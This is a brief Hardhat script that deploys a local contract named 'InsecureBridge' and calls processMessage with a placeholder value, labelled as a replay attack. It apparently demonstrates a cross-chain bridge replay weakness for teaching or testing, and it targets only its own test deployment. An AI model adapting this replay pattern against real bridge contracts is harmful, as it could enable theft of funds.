const { ethers } = require("hardhat");

async function main() {
    const [attacker] = await ethers.getSigners();

    // Deploy the cross-chain bridge contract
    const Bridge = await ethers.getContractFactory("InsecureBridge");
    const bridge = await Bridge.deploy();
    await bridge.deployed();
    console.log("Bridge contract deployed at:", bridge.address);

    // Attacker replays a previously signed transaction
    console.log("🚨 Executing replay attack...");
    await bridge.processMessage("0x123456789abcdef"); // Replaying message
}

main().catch((error) => {
    console.error("❌ Attack failed:", error);
    process.exit(1);
});
